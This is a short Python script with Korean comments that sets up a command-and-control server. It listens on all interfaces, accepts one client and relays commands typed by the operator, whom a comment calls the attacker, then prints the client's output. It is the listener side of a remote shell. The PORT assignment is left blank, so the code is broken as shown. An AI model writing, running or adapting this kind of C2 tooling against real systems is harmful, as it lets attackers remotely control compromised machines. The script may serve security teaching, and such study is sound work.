import socket

# C2 서버 설정
HOST = "0.0.0.0"  # 모든 IP에서 연결 가능
PORT =         # 사용할 포트

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"[+] C2 서버 대기 중... (포트 {PORT})")

client, addr = server.accept()
print(f"[+] 연결됨: {addr}")

while True:
    command = input("C2 명령어 입력: ")  # 공격자가 명령 입력
    client.send(command.encode("utf-8"))
    if command.lower() == "exit":
        break
    response = client.recv(4096).decode("utf-8")
    print(f"[+] 결과:\n{response}")

client.close()
server.close()
